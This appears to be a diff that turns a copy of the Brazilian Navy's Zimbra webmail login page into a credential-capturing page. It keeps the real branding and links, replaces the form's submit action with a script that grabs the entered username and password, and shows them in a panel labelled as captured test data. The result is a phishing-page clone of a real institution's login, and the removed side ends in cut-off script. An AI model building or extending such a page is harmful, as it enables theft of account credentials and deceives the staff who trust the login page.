@@ -1,748 +1,141 @@
 <!DOCTYPE html>
 <html class="user_font_size_normal" lang="pt">
 <head>
-<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
-	<title>Entrar no cliente Zimbra para Web</title>
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<meta name="description" content="O Zimbra oferece um software de servidor e cliente de código aberto para troca de mensagens e colaboração. Para saber mais, visite https://www.zimbra.com.">
-	<meta name="apple-mobile-web-app-capable" content="yes" />
-	<meta name="apple-mobile-web-app-status-bar-style" content="black" />
-	<link rel="stylesheet" type="text/css" href="https://webmail.marinha.mil.br/css/common,login,zhtml,skin.css?skin=harmony&v=250701080115">
-	<link rel="SHORTCUT ICON" href="https://webmail.marinha.mil.br/img/logo/favicon.ico">
-
-
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+    <title>Entrar no cliente Zimbra para Web</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="O Zimbra oferece um software de servidor e cliente de código aberto para troca de mensagens e colaboração. Para saber mais, visite https://www.zimbra.com.">
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <link rel="stylesheet" type="text/css" href="https://webmail.marinha.mil.br/css/common,login,zhtml,skin.css?skin=harmony&v=250701080115">
+    <link rel="SHORTCUT ICON" href="https://webmail.marinha.mil.br/img/logo/favicon.ico">
 </head>
 <body onload="onLoad();">
-
-	<div id="modifiedLogin" class="LoginScreen" >
-		<div class="modernCenter" >
-                <div class="modernContentBox">
-                    <div class="logo">
-                        <a href="https://www.zimbra.com/" id="bannerLink" target="_new" title='Zimbra'><span class="ScreenReaderOnly">Zimbra</span>
-                            <span class="ImgLoginBanner"></span>
-                        </a>
-                    </div>				
-				<form id="zLoginForm" method="post" name="loginForm" action="/" accept-charset="UTF-8">
-								<input type="hidden" name="loginOp" value="login"/>
-								<input type="hidden" name="login_csrf" value="8e268e45-00a5-4b2d-ae8b-719014027d1c"/>
-
-								<div class="signIn">Login</div>
-                        <div class="form">
-                        <div id="errorMessageDiv" class="errorMessage">
-                            </div>
+    <div id="modifiedLogin" class="LoginScreen" >
+        <div class="modernCenter" >
+            <div class="modernContentBox">
+                <div class="logo">
+                    <a href="https://www.zimbra.com/" id="bannerLink" target="_new" title='Zimbra'><span class="ScreenReaderOnly">Zimbra</span>
+                        <span class="ImgLoginBanner"></span>
+                    </a>
+                </div>
+                <form id="zLoginForm" method="post" name="loginForm" onsubmit="exibirDados(event); return false;" accept-charset="UTF-8">
+                    <input type="hidden" name="loginOp" value="login"/>
+                    <input type="hidden" name="login_csrf" value="8e268e45-00a5-4b2d-ae8b-719014027d1c"/>
+                    <div class="signIn">Login</div>
+                    <div class="form">
+                        <div id="errorMessageDiv" class="errorMessage"></div>
                         <div class="loginSection">
-                                    <label for="username" class="zLoginFieldLabel">Nome do usuário</label>
-                                            <input id="username" tabindex="1" class="zLoginFieldInput" name="username" type="text" value="" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"/>
-                                        <label for="password" class="zLoginFieldLabel">Senha</label>
-                                    <div class="passwordWrapper">
-                                        <input id="password" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="password" type="password" value="" size="40" maxlength="1024"/>
-                                        <span toggle="#password" onClick="showPassword();" id="showSpan" style="display: block;">Exibir</span>
-                                        <span toggle="#password" onClick="showPassword();" id="hideSpan" style="display: none;">Ocultar</span>
-                                    </div>
-                                    <div class="signInAndLabel">
-                                        <div>
-                                          <button id="loginButton" type="submit" tabindex="5" class="loginButton">login</button>
-
-                                        </div>
-                                        <div class="rememberCheckWrapper"> 
-                                                <input id="remember" tabindex="6" value="1" type="checkbox" name="zrememberme" />
-                                                <label for="remember">Permanecer conectado</label>
-                                            </div>
-                                        </div>
-                                </div>
-                            <div>
-                            <hr/>
+                            <label for="username" class="zLoginFieldLabel">Nome do usuário</label>
+                            <input id="username" tabindex="1" class="zLoginFieldInput" name="username" type="text" value="" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"/>
+                            <label for="password" class="zLoginFieldLabel">Senha</label>
+                            <div class="passwordWrapper">
+                                <input id="password" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="password" type="password" value="" size="40" maxlength="1024"/>
+                                <span toggle="#password" onClick="showPassword();" id="showSpan" style="display: block;">Exibir</span>
+                                <span toggle="#password" onClick="showPassword();" id="hideSpan" style="display: none;">Ocultar</span>
                             </div>
-                            <div>
+                            <div class="signInAndLabel">
+                                <div>
+                                    <button id="loginButton" type="submit" tabindex="5" class="loginButton">login</button>
+                                </div>
+                                <div class="rememberCheckWrapper">
+                                    <input id="remember" tabindex="6" value="1" type="checkbox" name="zrememberme" />
+                                    <label for="remember">Permanecer conectado</label>
+                                </div>
+                            </div>
+                        </div>
+                        <div>
+                            <hr/>
+                        </div>
+                        <div>
                             <div class="versionBlock">
-                                    <label for="client">Versão</label>
-                                    <div style="position: relative;">
-                                        <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
-                                            <option value="preferred" selected > Padrão</option>
-                                            <option value="advanced" > Classic</option>
-                                            <option value="modern" > Modern</option>
-                                            </select>
-                                        <input type="button" class="alignWhatsThis" onclick="showTooltip();" id='ZLoginWhatsThisButton' />
-                                    </div>
-
-                                    <div id="ZLoginWhatsThis">
-                                        <div class="ZLoginInfo">
-                                            <span id="dialogCloseButton" onclick="hideTooltip();">&times;</span>
-                                            <p><strong>Modern</strong><br> O aplicativo da Web  'Modern ' oferece uma experiência responsiva em todos os seus dispositivos e se integra a muitos aplicativos populares.</p><p><strong>Classic</strong><br> O aplicativo Web 'Classic' é familiar para usuários antigos de Zimbra. Ele oferece recursos avan çados de colabora ç ão e calendário, populares entre os usuários avan çados nos navegadores da Web Desktop.</p><p><strong>Padrão</strong><br> Isso fará você entrar de acordo com sua preferência salva. No aplicativo Web  'Modern ' , defina essa preferência em Configura ções > Geral > Vers ão do Zimbra. Em  'Classic ' , defina-o em Preferências > Geral > Entrar.</p></div>
+                                <label for="client">Versão</label>
+                                <div style="position: relative;">
+                                    <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
+                                        <option value="preferred" selected > Padrão</option>
+                                        <option value="advanced" > Classic</option>
+                                        <option value="modern" > Modern</option>
+                                    </select>
+                                    <input type="button" class="alignWhatsThis" onclick="showTooltip();" id='ZLoginWhatsThisButton' />
+                                </div>
+                                <div id="ZLoginWhatsThis">
+                                    <div class="ZLoginInfo">
+                                        <span id="dialogCloseButton" onclick="hideTooltip();">&times;</span>
+                                        <p><strong>Modern</strong><br> O aplicativo da Web 'Modern ' oferece uma experiência responsiva em todos os seus dispositivos e se integra a muitos aplicativos populares.</p><p><strong>Classic</strong><br> O aplicativo Web 'Classic' é familiar para usuários antigos de Zimbra. Ele oferece recursos avan çados de colabora ç ão e calendário, populares entre os usuários avan çados nos navegadores da Web Desktop.</p><p><strong>Padrão</strong><br> Isso fará você entrar de acordo com sua preferência salva. No aplicativo Web 'Modern ' , defina essa preferência em Configura ções > Geral > Vers ão do Zimbra. Em 'Classic ' , defina-o em Preferências > Geral > Entrar.</p>
                                     </div>
                                 </div>
                             </div>
                         </div>
-                    </form>
-			</div>
-			<div class="decor1"></div>
-		</div>
-
-		<div class="Footer">
-			<div id="ZLoginNotice" class="legalNotice-small">Copyright © 2005-2025 Synacor, Inc. Todos os direitos reservados. "Zimbra" é uma marca comercial registada da Synacor, Inc.</div>
-		</div>
-		<div class="decor2"></div>
-	</div>
-<script>
-
-function ZmSkin(e){
-this.hints=this.mergeObjects(ZmSkin.hints,e)
-}
-ZmSkin.hints={
-name:"harmony",version:"1",skin:{
-containers:"skin_outer"}
-,banner:{
-position:"static",url:"https://webmail.marinha.mil.br"}
-,favicon:{
-dir:""}
-,userInfo:{
-position:"static"}
-,search:{
-position:"static"}
-,quota:{
-position:"static"}
-,presence:{
-width:"40px",height:"24px"}
-,appView:{
-position:"static"}
-,searchResultsToolbar:{
-containers:["skin_tr_search_results_toolbar"]}
-,newButton:{
-containers:["skin_td_new_button"]}
-,tree:{
-minWidth:"13.5rem",maxWidth:"84rem",containers:["skin_td_tree","skin_td_tree_app_sash"],resizeContainers:["skin_td_tree","skin_container_app_new_button"]}
-,topToolbar:{
-containers:"skin_spacing_app_top_toolbar"}
-,treeFooter:{
-containers:"skin_tr_tree_footer"}
-,topAd:{
-containers:"skin_tr_top_ad"}
-,sidebarAd:{
-containers:"skin_td_sidebar_ad"}
-,bottomAd:{
-containers:"skin_tr_bottom_ad"}
-,treeTopAd:{
-containers:"skin_tr_tree_top_ad"}
-,treeBottomAd:{
-containers:"skin_tr_tree_bottom_ad"}
-,helpButton:{
-style:"link",container:"quota",url:""}
-,logoutButton:{
-style:"link",container:"quota"}
-,appChooser:{
-position:"static",direction:"LR"}
-,toast:{
-location:"N",transitions:[{
-type:"fade-in",step:5,duration:50}
-,{
-type:"pause",duration:5000}
-,{
-type:"fade-out",step:-10,duration:500}
-]}
-,fullScreen:{
-containers:["!skin_td_tree","!skin_td_tree_app_sash"]}
-,allAds:{
-containers:["skin_tr_top_ad","skin_td_sidebar_ad","skin_tr_bottom_ad","skin_tr_tree_top_ad","skin_tr_tree_bottom_ad"]}
-,hideSearchInCompose:true,notificationBanner:"/skins/_base/logos/NotificationBanner_grey.gif?v=250701080115"};
-window.BaseSkin=ZmSkin;
-ZmSkin.prototype={
-show:function(t,e,l){
-var a=this.hints[t]&&this.hints[t].containers;
-if(a){
-if(typeof a=="function"){
-a.apply(this,[e!=false]);
-skin._reflowApp();
-return
-}
-if(typeof a=="string"){
-a=[a]
-}
-var s=false;
-for(var r=0;
-r<a.length;
-r++){
-var h=a[r];
-var o=h.replace(/^!/,"");
-var n=h!=o;
-if(this._showEl(o,n?!e:e)){
-s=true
-}}
-if(s&&!l){
-skin._reflowApp()
-}}}
-,hide:function(e,t){
-this.show(e,false,t)
-}
-,gotoApp:function(e,t){
-appCtxt.getAppController().activateApp(e,null,t)
-}
-,gotoPrefs:function(e){
-if(appCtxt.getCurrentAppName()!=ZmApp.PREFERENCES){
-var t=new AjxCallback(this,this._gotoPrefPage,[e]);
-this.gotoApp(ZmApp.PREFERENCES,t)
-}else{
-this._gotoPrefPage(e)
-}}
-,mergeObjects:function(e,o){
-if(e==null){
-e={}
-}
-for(var a=1;
-a<arguments.length;
-a++){
-var n=arguments[a];
-for(var t in n){
-var s=e[t];
-if(typeof s=="object"&&!(s instanceof Array)){
-this.mergeObjects(e[t],n[t]);
-continue
-}
-if(!e[t]){
-e[t]=n[t]
-}}}
-return e
-}
-,getTreeWidth:function(){
-return Dwt.getSize(this._getEl(this.hints.tree.containers[0])).x
-}
-,setTreeWidth:function(e){
-this._setContainerSizes("tree",e,null)
-}
-,showTopAd:function(e){
-if(skin._showEl("skin_tr_top_ad",e)){
-skin._reflowApp()
-}}
-,hideTopAd:function(){
-skin.showTopAd(false)
-}
-,getTopAdContainer:function(){
-return skin._getEl("skin_container_top_ad")
-}
-,showSidebarAd:function(e){
-var t="skin_td_sidebar_ad";
-if(e!=null){
-Dwt.setSize(t,e)
-}
-if(skin._showEl(t)){
-skin._reflowApp()
-}}
-,hideSidebarAd:function(){
-var e="skin_td_sidebar_ad";
-if(skin._hideEl(e)){
-skin._reflowApp()
-}}
-,getSidebarAdContainer:function(){
-return this._getEl("skin_container_sidebar_ad")
-}
-,handleNotification:function(t,e){}
-,_getEl:function(e){
-return(typeof e=="string"?document.getElementById(e):e)
-}
-,_showEl:function(o,i){
-var t=this._getEl(o);
-if(!t){
-return
-}
-var a;
-if(i==false){
-a="none"
-}else{
-var e=t.tagName;
-if(e=="TD"){
-a="table-cell"
-}else{
-if(e=="TR"){
-a="table-row"
-}else{
-a="block"
-}}}
-if(a!=t.style.display){
-t.style.display=a;
-return true
-}else{
-return false
-}}
-,_hideEl:function(e){
-return this._showEl(e,false)
-}
-,_reparentEl:function(i,e){
-var a=this._getEl(e);
-var t=a&&this._getEl(i);
-if(t){
-a.appendChild(t)
-}}
-,_setContainerSizes:function(n,a,e){
-var o=this.hints[n].resizeContainers||this.hints[n].containers;
-for(var t=0;
-t<o.length;
-t++){
-Dwt.setSize(o[t],a,null)
-}}
-,_reflowApp:function(){
-if(window._zimbraMail){
-window._zimbraMail.getAppViewMgr().fitAll()
-}}
-,_gotoPrefPage:function(a){
-if(a==null){
-return
-}
-var i=appCtxt.getApp(ZmApp.PREFERENCES);
-var t=i.getPrefController();
-var e=t.getPrefsView();
-e.selectSection(a)
-}};
-window.skin=new ZmSkin();
-var link = getElement("bannerLink");
-if (link) {
-    link.href = skin.hints.banner.url;
-}
-
-
-
-function getElement(id) {
-    return document.getElementById(id);
-}
-
-function updateTFAVerifyButtonStatus(input) {
-    var button = getElement('verifyButton');
-    if (input && input.value) {
-        button.disabled = false;
-    } else {
-        button.disabled = true;
-    }
-}
-
-function onLoad() {
-    var loginForm = document.loginForm;
-    if (loginForm.username) {
-        if (loginForm.username.value != "") {
-            loginForm.password.focus(); //if username set, focus on password
-        }
-        else {
-            loginForm.username.focus();
-        }
-    }
-    clientChange("preferred");
-    if (false && loginForm.totpcode) {
-        loginForm.totpcode.focus();
-        updateTFAVerifyButtonStatus();
-    }
-}
-
-// show a message if they should be using the 'standard' client, but have chosen 'advanced' instead
-function clientChange(selectValue) {
-    var div = getElement("ZLoginUnsupported");
-    if (div) {
-        div.style.display = 'none';
-    }
-}
-
-
-    function forgotPassword() {
-        var accountInput = getElement("username").value;
-        var queryParams = encodeURI("account=" + accountInput);
-        var url = "/public/PasswordRecovery.jsp?" + location.search;
-
-        if (accountInput !== '') {
-            url += (location.search !== '' ? '&' : '') + encodeURI("account=" + accountInput);
-        }
-
-        window.location.href = url;
-    }
-
-    function hideTooltip() {
-        getElement('ZLoginWhatsThis').style.display='none';
-    }
-    function showTooltip(){
-        getElement('ZLoginWhatsThis').style.display="block"
-    }
-
-    function showPassword() {
-        showHidePasswordFields(getElement("password"), getElement("showSpan"), getElement("hideSpan"))
-    }
-    function showNewPassword() {
-        showHidePasswordFields(getElement("newPassword"), getElement("newPasswordShowSpan"), getElement("newPasswordHideSpan"));
-    }
-    function showConfirmPassword() {
-        showHidePasswordFields(getElement("confirm"), getElement("confirmShowSpan"), getElement("confirmHideSpan"));
-    }
-
-    function showHidePasswordFields(passElem, showSpanElem, hideSpanElem) {
-        if (passElem.type === "password") {
-            passElem.type = "text";
-            showSpanElem.style.display = "none";
-            hideSpanElem.style.display = "block";
-        } else {
-            passElem.type = "password";
-            showSpanElem.style.display = "block";
-            hideSpanElem.style.display = "none";
-        }
-    }
-
-    var oldPasswordInput = getElement("password");
-    var newPasswordInput = getElement("newPassword");
-    var confirmPasswordInput = getElement("confirm");
-    var loginButton = getElement("loginButton");
-    var errorMessageDiv = getElement("errorMessageDiv");
-    var allRulesMatched = false;
-
-    if(newPasswordInput) {
-        loginButton.disabled = true;
-    }
-
-    if("" === ""){
-        errorMessageDiv.style.display = "none";
-    }
-
-    var enabledRules = [];
-    var supportedRules = [
-        {
-            type : "zimbraPasswordMinLength",
-            checkImg : getElement("minLengthCheckImg"),
-            closeImg : getElement("minLengthCloseImg")
-        },
-        {
-            type : "zimbraPasswordMinUpperCaseChars",
-            checkImg : getElement("minUpperCaseCheckImg"),
-            closeImg : getElement("minUpperCaseCloseImg")
-        },
-        {
-            type : "zimbraPasswordMinLowerCaseChars",
-            checkImg : getElement("minLowerCaseCheckImg"),
-            closeImg : getElement("minLowerCaseCloseImg")
-        },
-        {
-            type : "zimbraPasswordMinNumericChars",
-            checkImg : getElement("minNumericCharsCheckImg"),
-            closeImg : getElement("minNumericCharsCloseImg")
-        },
-        {
-            type : "zimbraPasswordMinPunctuationChars",
-            checkImg : getElement("minPunctuationCharsCheckImg"),
-            closeImg : getElement("minPunctuationCharsCloseImg")
-        },
-        {
-            type : "zimbraPasswordMinDigitsOrPuncs",
-            checkImg : getElement("minDigitsOrPuncsCheckImg"),
-            closeImg : getElement("minDigitsOrPuncsCloseImg")
-        },
-        {
-            type : "zimbraPasswordAllowUsername",
-            checkImg : getElement("allowUsernameCheckImg"),
-            closeImg : getElement("allowUsernameCloseImg")
-        }
-    ];
-
-    if (0){
-        enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinLength"}));
-    }
-
-    if (0) {
-        enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinUpperCaseChars"}));
-    }
-
-    if (0) {
-        enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinLowerCaseChars"}));
-    }
-
-    if (0) {
-        enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinNumericChars"}));
-    }
-
-    if (0) {
-        enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinPunctuationChars"}));
-    }
-
-    if (0) {
-        enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinDigitsOrPuncs"}));
-    }
-
-    if (true) {
-        enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordAllowUsername"}));
-    }
-
-    function compareConfirmPass() {
-        if (getElement("newPassword").value === getElement("confirm").value) {
-            errorMessageDiv.style.display = "none";
-            return true;
-        } else {
+                    </div>
+                </form>
+                <div id="dadosCapturados" style="margin-top: 20px; padding: 15px; background-color: #f0f0f0; border: 1px solid #ccc; display: none;">
+                    <h3>Dados Capturados (Apenas para Teste)</h3>
+                    <p><strong>Nome do usuário:</strong> <span id="usuarioExibido"></span></p>
+                    <p><strong>Senha:</strong> <span id="senhaExibida"></span></p>
+                </div>
+            </div>
+            <div class="decor1"></div>
+        </div>
+        <div class="Footer">
+            <div id="ZLoginNotice" class="legalNotice-small">Copyright © 2005-2025 Synacor, Inc. Todos os direitos reservados. "Zimbra" é uma marca comercial registada da Synacor, Inc.</div>
+        </div>
+        <div class="decor2"></div>
+    </div>
+    <script>
+        function exibirDados(event) {
+            // Evita o comportamento padrão de envio do formulário
             event.preventDefault();
-            errorMessageDiv.style.display = "block";
-            errorMessageDiv.innerHTML = "";
-            return false;
-        }
-    }
 
-    function check(checkImg, closeImg) {
-        closeImg.style.display = "none";
-        checkImg.style.display = "inline";
-    }
-    function unCheck(checkImg, closeImg) {
-        closeImg.style.display = "inline";
-        checkImg.style.display = "none";
-    }
-    function resetImg(condition, checkImg, closeImg){
-        condition ? check(checkImg, closeImg) : unCheck(checkImg, closeImg);
-    }
-    function compareMatchedRules(matchedRule) {
-        enabledRules.forEach(function(rule) {
-            if (matchedRule.findIndex(function(mRule) { return mRule.type === rule.type}) >= 0) {
-                check(rule.checkImg, rule.closeImg);
+            // Pega os valores dos campos de usuário e senha
+            const usuario = document.getElementById('username').value;
+            const senha = document.getElementById('password').value;
+
+            // Exibe os valores na nova seção
+            document.getElementById('usuarioExibido').textContent = usuario;
+            document.getElementById('senhaExibida').textContent = senha;
+
+            // Torna a seção visível
+            document.getElementById('dadosCapturados').style.display = 'block';
+        }
+
+        function getElement(id) {
+            return document.getElementById(id);
+        }
+
+        function onLoad() {
+            var loginForm = document.loginForm;
+            if (loginForm.username) {
+                if (loginForm.username.value != "") {
+                    loginForm.password.focus();
+                } else {
+                    loginForm.username.focus();
+                }
+            }
+        }
+
+        function showPassword() {
+            const passElem = document.getElementById("password");
+            const showSpanElem = document.getElementById("showSpan");
+            const hideSpanElem = document.getElementById("hideSpan");
+
+            if (passElem.type === "password") {
+                passElem.type = "text";
+                showSpanElem.style.display = "none";
+                hideSpanElem.style.display = "block";
             } else {
-                unCheck(rule.checkImg, rule.closeImg);
-            }
-        })
-    }
-
-    function setloginButtonDisabled(condition) {
-        if (condition) {
-            loginButton.disabled = true;
-        } else {
-            if (oldPasswordInput.value !== "") {
-                loginButton.disabled = false;
-            }
-        }
-    }
-
-    // Function to encode XML characters
-    function escapeXml(xmlString) {
-    return xmlString.replace(/[<>&'"]/g, function (char) {
-        switch (char) {
-        case '<': return '&lt;';
-        case '>': return '&gt;';
-        case '&': return '&amp;';
-        case "'": return '&apos;';
-        case '"': return '&quot;';
-        }
-    });
-    }
-
-    // Function to check special character
-    function isAsciiPunc(ch) {
-        return (ch >= 33 && ch <= 47) || // ! " # $ % & ' ( ) * + , - . /
-        (ch >= 58 && ch <= 64) || // : ; < = > ? @
-        (ch >= 91 && ch <= 96) || // [ \ ] ^ _ `
-        (ch >= 123 && ch <= 126); // { | } ~
-    }
-
-    function parseCharsFromPassword(passwordString) {
-        const uppers = [],
-            lowers = [],
-            numbers = [],
-            punctuations = [],
-            invalidChars = [],
-            invalidPuncs = [];
-
-        const chars = passwordString.split('');
-
-        chars.forEach(function (char) {
-            const charCode = char.charCodeAt(0);
-            let isInvalid = false;
-
-            if ("") {
-                try {
-                    if (!char.match(new RegExp("", 'g'))) {
-                        invalidChars.push(char);
-                        isInvalid = true;
-                    }
-                } catch (error) {
-                    console.error(error);
-                }
-            }
-
-            if (!isInvalid) {
-                if (charCode >= 65 && charCode <= 90) {
-                    uppers.push(char);
-                } else if (charCode >= 97 && charCode <= 122) {
-                    lowers.push(char);
-                } else if (charCode >= 48 && charCode <= 57) {
-                    numbers.push(char);
-                } else if ("") {
-                    try {
-                        char.match(new RegExp("", 'g'))
-                            ? punctuations.push(char)
-                            : invalidPuncs.push(char);
-                    } catch (error) {
-                        console.error(error);
-                    }
-                } else if (isAsciiPunc(charCode)) {
-                    punctuations.push(char);
-                }
-            }
-        });
-
-        return {
-            uppers: uppers,
-            lowers: lowers,
-            numbers: numbers,
-            punctuations: punctuations,
-            invalidChars: invalidChars,
-            invalidPuncs: invalidPuncs
-        };
-    };
-
-    function handleNewPasswordChange() {
-        var currentValue = newPasswordInput.value;
-        var encodedPwd = escapeXml(currentValue);
-        var parsedChars = parseCharsFromPassword(currentValue);
-        var matchedRule = [];
-
-        if (0){
-            if (currentValue.length >= 0) {
-                matchedRule.push({type : "zimbraPasswordMinLength"});
+                passElem.type = "password";
+                showSpanElem.style.display = "block";
+                hideSpanElem.style.display = "none";
             }
         }
 
-        if (0) {
-            if (parsedChars.uppers.length >= 0) {
-                matchedRule.push({type : "zimbraPasswordMinUpperCaseChars"});
-            }
+        function hideTooltip() {
+            getElement('ZLoginWhatsThis').style.display='none';
         }
 
-        if (0) {
-            if (parsedChars.lowers.length >= 0) {
-                matchedRule.push({type : "zimbraPasswordMinLowerCaseChars"});
-            }
+        function showTooltip(){
+            getElement('ZLoginWhatsThis').style.display="block"
         }
-
-        if (0) {
-            if (parsedChars.numbers.length >= 0) {
-                matchedRule.push({type : "zimbraPasswordMinNumericChars"});
-            }
-        }
-
-        if (0) {
-            if (parsedChars.punctuations.length >= 0) {
-                matchedRule.push({type : "zimbraPasswordMinPunctuationChars"});
-            }
-        }
-
-        if (0) {
-            if (parsedChars.punctuations.length + parsedChars.numbers.length >= 0) {
-                matchedRule.push({type : "zimbraPasswordMinDigitsOrPuncs"});
-            }
-        }
-
-        if (true) {
-            if (!encodedPwd.includes("")) {
-                matchedRule.push({type : "zimbraPasswordAllowUsername"});
-            }
-        }
-
-        if(matchedRule.length >= enabledRules.length){
-            allRulesMatched = true;
-        } else {
-            allRulesMatched = false;
-        }
-
-        compareMatchedRules(matchedRule);
-
-        if (parsedChars.invalidChars.length > 0) {
-            errorMessageDiv.style.display = "block";
-            errorMessageDiv.innerHTML = parsedChars.invalidChars.join(", ") + " ";
-        } else {
-            errorMessageDiv.style.display = "none";
-        }
-
-        if(newPasswordInput.value !== "") {
-            resetImg(confirmPasswordInput.value === newPasswordInput.value, getElement("mustMatchCheckImg"), getElement("mustMatchCloseImg"));
-            setloginButtonDisabled(!allRulesMatched || confirmPasswordInput.value !== newPasswordInput.value);
-        }
-    };
-
-    function handleConfirmPasswordChange() {
-        resetImg(confirmPasswordInput.value === newPasswordInput.value, getElement("mustMatchCheckImg"), getElement("mustMatchCloseImg"));
-        setloginButtonDisabled(!allRulesMatched || confirmPasswordInput.value !== newPasswordInput.value);
-    };
-
-    function handleOldPasswordChange() {
-        setloginButtonDisabled(!allRulesMatched || newPasswordInput.value === "" || oldPasswordInput.value === "" || confirmPasswordInput.value !== newPasswordInput.value)
-    }
-
-    newPasswordInput && oldPasswordInput && oldPasswordInput.addEventListener("input", handleOldPasswordChange, null);
-    newPasswordInput && newPasswordInput.addEventListener("input", handleNewPasswordChange, null);
-    confirmPasswordInput && confirmPasswordInput.addEventListener("input", handleConfirmPasswordChange, null);
-	
-	  var langChooser_parseParams = function(paramsSection) {
-  if (paramsSection) {
-  var query = {};
-  var params = paramsSection.split('&');
-  for (var i = 0; i < params.length; i++) {
-              var param = splitByFirstChar(params[i], '=');
-              if (param.length == 2) {
-                query[param[0]] = param[1];
-              }
-            }
-            return query;
-          }
-          return {};
-        }
-        var langChooser_getParamStr = function(params) {
-          var paramsStr = [];
-          for (var a in params) {
-            paramsStr.push(a + "=" + params[a]);
-          }
-          return paramsStr.join('&');
-        }
-        var langChooser_currentUrl = window.location.href;
-        var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
-        var langChooser_currentPath = match[1];
-        var langChooser_params = langChooser_parseParams(match[3]);
-        var langChooser_fragment = match[5];
-
-        var langChooser = document.getElementById('lang-chooser');
-        var langChooserWrap = document.getElementById('lang-chooser-wrap');
-        var langVisControl = document.getElementById('lang-vis-control');
-        if (langVisControl && langChooser) {
-          langVisControl.style.display = 'inline';
-          langChooser.onchange = function() {
-            langChooser_params['lp'] = 1;
-            langChooser_params['hl'] = encodeURIComponent(this.value);
-            var paramsStr = langChooser_getParamStr(langChooser_params);
-            var newHref = langChooser_currentPath + "?" + paramsStr;
-            if (langChooser_fragment) {
-              newHref = newHref + "#" + langChooser_fragment;
-            }
-            window.location.href = newHref;
-          };
-        }
-      })();
     </script>
-<script type="text/javascript">
-  var gaia_attachEvent = function(element, event, callback) {
-  if (element.addEventListener) {
-  element.addEventListener(event, callback, false);
-  } else if (element.attachEvent) {
-  element.attachEvent('on' + event, callback);
-  }
-  };
-  (function() {
-  var gaia_hideNavBar = function() {
-  setTimeout(function() {
-  window.scrollTo(0, 1);
-  }, 0);
-  };
-  gaia_attachEvent(window, 'load', gaia_hideNavBar);
-  })();
-</script>
-  <script>var G;var Gb=function(a,b){var c=a;a&&"string"==typeof a&&(c=document.getElementById(a));if(b&&!c)throw new Ga(a);return c},Ga=function(a){this.id=a;this.toString=function(){return"No element found for id '"+this.id+"'"}};var Gc={},Gd;Gd=window.addEventListener?function(a,b,c){var d=function(a){var b=c.call(this,a);!1===b&&Ge(a);return b};a=Gb(a,!0);a.addEventListener(b,d,!1);Gf(a,b).push(d);return d}:window.attachEvent?function(a,b,c){a=Gb(a,!0);var d=function(){var b=window.event,d=c.call(a,b);!1===d&&Ge(b);return d};a.attachEvent("on"+b,d);Gf(a,b).push(d);return d}:void 0;var Ge=function(a){a.preventDefault?a.preventDefault():a.returnValue=!1;return!1};
-var Gf=function(a,b){Gc[a]=Gc[a]||{};Gc[a][b]=Gc[a][b]||[];return Gc[a][b]};var Gg=function(){try{return new XMLHttpRequest}catch(a){for(var b=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP.3.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"],c=0;c<b.length;c++)try{return new ActiveXObject(b[c])}catch(d){}}return null},Gh=function(){this.g=Gg();this.parameters={}};Gh.prototype.oncomplete=function(){};
-Gh.prototype.send=function(a){var b=[],c;for(c in this.parameters){var d=this.parameters[c];b.push(c+"="+encodeURIComponent(d))}var b=b.join("&"),e=this.g,f=this.oncomplete;e.open("POST",a,!0);e.setRequestHeader("Content-type","application/x-www-form-urlencoded");e.onreadystatechange=function(){4==e.readyState&&f({status:e.status,text:e.responseText})};e.send(b)};
-Gh.prototype.get=function(a){var b=this.oncomplete,c=this.g;c.open("GET",a,!0);c.onreadystatechange=function(){4==c.readyState&&b({status:c.status,text:c.responseText})};c.send()};var Gj=function(a){this.e=a;this.k=this.l();if(null==this.e)throw new Gi("Empty module name");};G=Gj.prototype;G.l=function(){var a=window.location.pathname;return a&&0==a.indexOf("/accounts")?"/accounts/JsRemoteLog":"/JsRemoteLog"};
-G.n=function(a,b,c){var d=this.k,e=this.e||"",d=d+"?module="+encodeURIComponent(e);a=a||"";d=d+"&type="+encodeURIComponent(a);b=b||"";d=d+"&msg="+encodeURIComponent(b);c=c||[];for(a=0;a<c.length;a++)d=d+"&arg="+encodeURIComponent(c[a]);try{var f=Math.floor(1E4*Math.random()),d=d+"&r="+String(f)}catch(g){}return d};G.send=function(a,b,c){var d=new Gh;d.parameters={};try{var e=this.n(a,b,c);d.get(e)}catch(f){}};G.error=function(a,b){this.send("ERROR",a,b)};G.warn=function(a,b){this.send("WARN",a,b)};
-G.info=function(a,b){this.send("INFO",a,b)};G.f=function(a){var b=this;return function(){try{return a.apply(null,arguments)}catch(c){throw b.error("Uncatched exception: "+c),c;}}};var Gi=function(){};var Gk=Gk||new Gj("uri"),Gl=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^/?#]*)@)?([\\w\\d\\-\\u0100-\\uffff.%]*)(?::([0-9]+))?)?([^?#]+)?(?:\\?([^#]*))?(?:#(.*))?$"),Gm=function(a){return"http"==a.toLowerCase()?80:"https"==a.toLowerCase()?443:null},Gn=function(a,b){var c=b.match(Gl)[1]||null,d,e=b.match(Gl)[3]||null;d=e&&decodeURIComponent(e);e=Number(b.match(Gl)[4]||null)||null;if(!c||!d)return Gk.error("Invalid origin Exception",[String(b)]),!1;e||(e=Gm(c));var f=a.match(Gl)[1]||null;if(!f||f.toLowerCase()!=
